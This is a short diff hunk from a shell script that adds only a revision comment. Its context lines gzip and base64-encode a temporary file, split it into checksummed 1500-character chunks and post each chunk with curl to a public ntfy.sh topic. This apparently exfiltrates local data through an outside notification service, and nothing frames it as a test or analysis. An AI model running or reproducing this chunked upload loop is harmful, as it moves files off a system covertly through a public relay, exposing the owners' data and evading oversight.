@@ -48,3 +48,4 @@ b=$(base64 -w0 /tmp/c_$$.gz 2>/dev/null || base64 /tmp/c_$$.gz)
 N=$(( (${#b}+1499)/1500 )); echo "CHUNKS=$N B64LEN=${#b}"
 i=1; while [ $i -le $N ]; do c=${b:$(( (i-1)*1500 )):1500}; crc=$(printf '%s' "$c" | cksum | cut -d' ' -f1); echo "C|$i/$N|$crc|$c"; curl -sS -m 10 -o /dev/null -w "NTFY|$i|%{http_code}\n" -d "C|$i/$N|$crc|$c" "https://ntfy.sh/$T"; i=$((i+1)); done
 echo "DONE"
+# rev2
